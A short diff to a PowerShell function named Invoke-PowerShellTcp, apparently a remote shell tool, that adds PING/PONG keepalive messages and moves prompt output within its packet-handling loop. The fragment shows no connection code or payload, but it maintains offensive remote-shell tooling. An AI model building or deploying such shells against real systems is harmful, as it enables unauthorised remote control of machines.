@@ -169,12 +169,13 @@ function Invoke-PowerShellTcp
                 if ($output.gettype() -eq [System.String]) { $output = @($output) }
 
                 Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
+                Write-ShellPacket (Get-ShellPrompt) $stream
+            } elseif ($packet.msg_type -eq "PING") {
+                Write-ShellPacket @{ "msg_type" = "PONG"; "data" = "" } $stream
             } elseif ($packet.msg_type -eq "KILL") {
                 $killed = $true
                 Exit
             }
-
-            Write-ShellPacket (Get-ShellPrompt) $stream
         }
     }
 
